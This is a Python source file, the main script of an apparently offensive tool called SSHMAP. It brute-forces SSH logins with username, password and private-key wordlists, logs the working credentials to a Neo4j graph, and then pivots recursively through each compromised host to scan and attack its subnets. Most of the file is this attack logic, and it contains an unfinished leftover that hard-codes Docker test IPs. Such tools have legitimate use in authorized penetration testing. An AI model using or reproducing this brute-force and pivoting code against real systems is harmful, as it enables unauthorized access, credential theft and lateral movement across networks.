import argparse
import asyncio
import os
import sys
from modules import bruteforce, graphdb, key_scanner
from modules.logger import sshmap_logger, setup_debug_logging
from modules.helpers.logger import highlight
from modules.config import CONFIG
from modules.utils import get_local_info, get_remote_info, read_targets, check_open_port, get_all_ips_in_subnet
from modules.credential_store import CredentialStore
from argparse import RawTextHelpFormatter
from modules.console import nxc_console
from rich.table import Table
from rich.live import Live

from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)


VERSION="0.1"

# Setup neo4j
graph = graphdb.GraphDB(CONFIG["neo4j_uri"], CONFIG["neo4j_user"], CONFIG["neo4j_pass"])

start_host, start_ips = get_local_info()
ssh_ports = CONFIG["ssh_ports"]
# Max depth for the ssh scan
max_depth = CONFIG["max_depth"]
# Thread-safe function to handle a target

console = nxc_console
visited_attempts = set()


progress = Progress(
    SpinnerColumn(),
    TextColumn("[bold]{task.fields[jump_host]}", justify="right"),
    BarColumn(),
    "[{task.completed}/{task.total}]",
    TimeElapsedColumn(),
    TimeRemainingColumn(),
    transient=True,
)

async def handle_target(target, maxworkers, credential_store, current_depth, jump=None, queue=None, blacklist_ips=None, progress=None, task_ids=None):
    try:   
        if current_depth > max_depth:
            sshmap_logger.info(f"Max depth {max_depth} reached. Skipping {target}")
            return
        source_host = start_host if current_depth == 1 else jump.get_remote_hostname()
        if jump is not None:
            sshmap_logger.info(f"New handle_target with target:{target} with jump {jump.get_host()} and current depth {current_depth} starting from {source_host}")
        else:
            sshmap_logger.info(f"New handle_target with target:{target} and current depth {current_depth} , starting from {source_host}")

        for port in ssh_ports:
            sshmap_logger.info(f"Scaning {target} port {port}.")
            # We can not check open ports if we are using a jump host, so we just try to connect to all ports
            if current_depth > 1 or await check_open_port(target, port):
                sshmap_logger.info(f"[{target}] Port {port} is open, starting bruteforce...")
                results = await bruteforce.try_all(target, port, maxworkers, jump, credential_store)
                for res in results:
                    if res.ssh_session:
                        #SSHSession object inside res
                        ssh_conn = res.get_ssh_connection()
                        # Add the target to the graph
                        # Get the remote hostname and IPs
                        sshmap_logger.info(f"[{target}:{port}] Get remote hostname and IPs")
                        remote_hostname, remote_ips = await get_remote_info(ssh_conn)

                        sshmap_logger.info(f"[{target}:{port}] Add target to database: {res.user}@{target} using {res.method}")
                        sshmap_logger.info(f"[{target}:{port}] Net info target: {remote_hostname} with IPs: {remote_ips}")
                        graph.add_host(remote_hostname, remote_ips)

                        sshmap_logger.info(f"[{target}:{port}] Add SSH connection {source_host}->{remote_hostname} with creds:{res.user}:{res.creds}")
                        graph.add_ssh_connection(from_hostname=source_host, to_hostname=remote_hostname, user=res.user, method=res.method, creds=res.creds, ip=target, port=port)
                        sshmap_logger.success(f"[{target}:{port}] Successfully added SSH connection from {source_host} to {remote_hostname} with user {res.user}")
                        #keys_found = key_scanner.find_keys(ssh_conn)
                        #logger.info(f"[{target}] Keys found: {keys_found}")
                        # I need to create new jobs only if i have not used this jump before
                        if remote_hostname not in visited_attempts and current_depth < max_depth:
                            
                            visited_attempts.add(remote_hostname)
                            new_targets = []
                            for remote_ip_cidr in remote_ips:
                                new_targets.extend(get_all_ips_in_subnet(remote_ip_cidr["ip"], remote_ip_cidr["mask"]))
                             # Create a progress task for the new remote_hostname
                            # remove duplicated targets
                            new_targets = list(set(new_targets))
                            # remove blacklisted ips
                            new_targets = [ip for ip in new_targets if ip not in blacklist_ips]
                            # tests with 4 ips only, for docker tests
                            new_targets = ["172.19.0.3","172.19.0.2","172.19.0.3","172.19.0.4"]
                            if progress and remote_hostname not in task_ids:
                                task_ids[remote_hostname] = progress.add_task(
                                    description=f"Scanning {remote_hostname}",
                                    total=len(new_targets),  # or len(new_targets) if scanning IPs
                                    jump_host=remote_hostname
                                )
                            sshmap_logger.info(f"Curent-depth: {current_depth}, scaning from: {source_host} We create a recursive job, using remote_hostname: {remote_hostname} as the jump, loaded {len(new_targets)} new targets")
                            for new_target in new_targets:
                                await queue.put((new_target, current_depth + 1, ssh_conn))
                        else:
                            sshmap_logger.info(f"Already scanned from {remote_hostname}. Skipping.")
                        # I dont know how to close the connection, if i close it here, the jump will fail.
                        #await ssh_conn.close()
    except asyncio.CancelledError:
        print(f"{target} was cancelled in handle target.")
        raise

async def worker(queue, semaphore, maxworkers, credential_store, blacklist_ips):
    while True:
        try:
            target, depth, jumper = await queue.get()

            async with semaphore:
                await handle_target(target, maxworkers, credential_store, current_depth=depth, jump=jumper, queue=queue, blacklist_ips=blacklist_ips)

        except asyncio.CancelledError:
            break
        finally:
            queue.task_done()

async def async_main(args):
    setup_debug_logging()
    credential_store = CredentialStore(args.credentialspath)
    targets = read_targets(args.targets)

    with open(args.users) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]
    keyfiles = [os.path.join(args.keys, f) for f in os.listdir(args.keys)]

    for user in users:
        for password in passwords:
            credential_store.store("_bruteforce", 22, user, password, "password")
        for keyfile in keyfiles:
            credential_store.store("_bruteforce", 22, user, keyfile, "keyfile")

    sshmap_logger.display(f"Starting attack on {len(targets)} targets with max depth {max_depth}")
    graph.add_host(start_host, start_ips)

    blacklist_ips = read_targets(args.blacklist) if args.blacklist else []

    # Launch multiple tasks concurrently for all targets
    queue = asyncio.Queue()
    initial_jump_host = start_host
    task_ids = {}

    for target in targets:
            await queue.put((target, 1, None))

    with Live(progress, console=console, refresh_per_second=10):

        

        # Add a task per initial jump host (in this case, just one unless more logic added)
        task_ids[initial_jump_host] = progress.add_task(
            description=f"Scanning from {initial_jump_host}",
            total=len(targets),
            jump_host=initial_jump_host
        )

        semaphore = asyncio.Semaphore(args.maxworkers)

        async def tracked_worker():
            while True:
                try:
                    target, depth, jumper = await queue.get()
                    current_jump = jumper.get_remote_hostname() if jumper else initial_jump_host

                    async with semaphore:
                        await handle_target(
                            target,
                            args.maxworkers,
                            credential_store,
                            depth,
                            jumper,
                            queue,
                            blacklist_ips,
                            progress,
                            task_ids
                        )

                    if current_jump in task_ids:
                        progress.update(task_ids[current_jump], advance=1)
                except asyncio.CancelledError:
                    break
                finally:
                    queue.task_done()

        workers = [asyncio.create_task(tracked_worker()) for _ in range(args.maxworkers)]

        try:
            await queue.join()
        except KeyboardInterrupt:
            sshmap_logger.warn("Ctrl+C received! Cancelling...")
        finally:
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            graph.close()

        sshmap_logger.success("All tasks completed.")
        print_jumphosts(visited_attempts)

    sshmap_logger.success("All tasks completed.")




def print_jumphosts(visited_attempts):
    """
    Prints the jumphostnames used from the visited_attempts set in a beautiful way.
    """


    # Create a table to display the jumphostnames
    table = Table(title="Jumphosts Used")
    table.add_column("Index", justify="right")
    table.add_column("Jumphostname", justify="left")

    # Add jumphostnames to the table
    for idx, jumphost in enumerate(visited_attempts, start=1):
        table.add_row(str(idx), jumphost)

    # Print the table
    console.print(table)

def main():

    parser = argparse.ArgumentParser(
        description=rf"""
███████╗███████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗ 
██╔════╝██╔════╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
███████╗███████╗███████║██╔████╔██║███████║██████╔╝
╚════██║╚════██║██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝ 
███████║███████║██║  ██║██║ ╚═╝ ██║██║  ██║██║     
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
                                                
                                                         
        SSH Credential Mapper - SSHMAP           
        Navigating the Maze of Access...   

    {highlight('Version', 'red')} : {highlight(VERSION)}
    """, formatter_class=RawTextHelpFormatter,)    
    parser.add_argument("--targets", required=True, help="Path to the file with target IPs")
    parser.add_argument("--blacklist", required=False, help="Path to the file with IPs to ignore")
    parser.add_argument("--users", default="wordlists/users.txt", help="Path to the file with usernames for bruteforce")
    parser.add_argument("--passwords", default="wordlists/passwords.txt", help="Path to the file with passwords for bruteforce")
    parser.add_argument("--credentialspath", default="wordlists/credentials.csv", help="Path to CSV credentials file, will populate users and passwords")
    parser.add_argument("--keys", default="wordlists/keys/", help="Path to directory with SSH private keys")
    parser.add_argument("--maxworkers", type=int, default=10, help="Number of workers for target")
    parser.add_argument("--maxdepth", type=int, default=3, help="Depth of the scan")
    parser.add_argument("--debug", action="store_true", help="enable debug level information")
    parser.add_argument("--verbose", action="store_true", help="enable verbose output")

    args = parser.parse_args()
    global max_depth
    max_depth = args.maxdepth


    sshmap_logger.debug("Starting async_main with args: %s", args)
    # Check if Neo4J database is running
    try:
        graph.driver.verify_connectivity()
    except Exception as e:
        sshmap_logger.error(f"Neo4J connectivity check failed, check if it is running: {e}")
        return
    asyncio.run(async_main(args))
    

if __name__ == "__main__":
    if sys.platform.startswith("win"):
        # Fix for Windows Proactor loop shutdown issues
        import asyncio.windows_events
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    main()
